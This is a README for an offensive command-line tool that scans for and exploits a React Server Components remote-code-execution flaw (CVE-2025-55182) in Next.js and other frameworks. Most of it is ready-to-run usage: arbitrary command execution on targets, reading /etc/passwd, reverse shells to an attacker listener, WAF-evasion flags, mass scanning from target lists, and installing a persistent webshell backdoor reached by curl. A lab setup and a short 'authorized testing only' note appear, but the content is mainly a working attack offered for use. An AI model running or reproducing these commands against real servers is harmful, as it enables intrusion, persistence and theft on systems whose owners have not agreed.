# React2Shell CLI

A comprehensive command-line scanner and exploit tool for CVE-2025-55182 (React Server Components RCE).

## Installation

```bash
# Using pip
pip install requests tqdm

# Or using uv
uv run --with requests --with tqdm python react2shell.py
```

## Quick Start

```bash
# Scan a target
python react2shell.py https://target.com

# Execute a command
python react2shell.py https://target.com -c "id"

# Interactive shell
python react2shell.py https://target.com -i

# Scan local project for vulnerable versions
python react2shell.py -L /path/to/project
```

## Supported Frameworks

| Framework | Flag | Output Method | Notes |
|-----------|------|---------------|-------|
| **Next.js** | `-F nextjs` (default) | X-Action-Redirect header | Full RCE with output |
| **React Router** | `-F react-router` | X-Action-Redirect header | ESM-compatible payload |
| **Waku** | `-F waku` | Blind (file write) | Requires `/RSC/F/{x}/{y}.txt` path |
| **Expo** | `-F expo` | Varies | Experimental RSC support |
| **Vite RSC** | `-F vite-rsc` | Varies | Plugin-based RSC |
| **Parcel RSC** | `-F parcel-rsc` | Varies | Plugin-based RSC |

### Framework-Specific Examples

```bash
# Next.js (default - auto-detected)
python react2shell.py http://localhost:3011 -c "id"

# React Router (ESM environment)
python react2shell.py http://localhost:3015 -F react-router -c "id"

# Waku (blind RCE - output written to /tmp/r2s_out.txt)
python react2shell.py http://localhost:3014 -F waku -c "cat /app/flag.txt"
# Then read output: docker exec <container> cat /tmp/r2s_out.txt
```

## Features

### Scanning Modes
- **Safe mode** (default): Side-channel detection without code execution
- **RCE mode** (`--rce`): Proof-of-concept with math operation
- **Local scanning** (`-L`): Check package.json for vulnerable versions

### Execution Modes
- **Command execution** (`-c`): Run arbitrary commands
- **Interactive shell** (`-i`): Persistent command session
- **Reverse shell** (`-r`): Multiple shell types (nc, bash, python, etc.)
- **File reading** (`-f`): Read remote files
- **Webshell** (`--webshell`): Install persistent backdoor on port 1337

### WAF Bypass Options
- **Junk data padding** (`-w`): Add padding to evade inspection limits
- **Unicode encoding** (`-u`): Encode payload as \uXXXX sequences
- **Vercel bypass** (`-V`): Vercel-specific WAF evasion

### Other Options
- **Proxy support** (`-x`): Route through Burp Suite or other proxies
- **Custom headers** (`-H`): Add custom HTTP headers
- **Multi-threading** (`-t`): Parallel scanning
- **JSON output** (`-o`): Save results for automation

## Usage Examples

```bash
# Basic scan
python react2shell.py https://target.com

# Scan with verbose output and version detection
python react2shell.py https://target.com -v

# Execute command with WAF bypass
python react2shell.py https://target.com -c "cat /etc/passwd" -w -u

# Interactive shell through proxy
python react2shell.py https://target.com -i -x http://127.0.0.1:8080

# Reverse shell
python react2shell.py https://target.com -r -l 10.0.0.1 -p 4444 -S bash

# Install webshell (persistent backdoor on port 1337)
python react2shell.py https://target.com --webshell mypassword
# Access: curl 'http://target:1337/?p=mypassword&cmd=id'

# Scan multiple targets from file
python react2shell.py targets.txt -t 20 -o results.json

# Check local project
python react2shell.py -L ./my-nextjs-app
```

## Lab Testing

```bash
# Start the lab environment
cd ../lab && docker-compose up -d

# Test each framework
python react2shell.py http://localhost:3011 -c "id"              # Next.js
python react2shell.py http://localhost:3015 -F react-router -c "id"  # React Router
python react2shell.py http://localhost:3014 -F waku -c "id"      # Waku (blind)
```

## All Options

Run `python react2shell.py --help` for full option list.

## Security Note

This tool is intended for authorized security testing only. Do not use against systems without explicit permission.
